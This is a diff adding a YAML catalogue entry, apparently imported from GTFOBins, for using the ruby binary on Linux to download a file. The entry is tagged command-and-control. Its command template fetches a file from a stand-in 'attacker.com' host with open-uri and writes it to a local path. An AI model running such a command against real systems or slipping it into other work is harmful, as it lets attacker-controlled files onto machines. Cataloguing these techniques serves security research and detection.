@@ -1,0 +1,24 @@
+id: gtfobins/ruby/download/unprivileged
+type: binary
+platform: linux
+name: ruby
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file");
+    IO.copy_stream(download, "/path/to/output-file")'
+references:
+- https://gtfobins.github.io/gtfobins/ruby/
+tags:
+- linux
+- unix
+- gtfobins
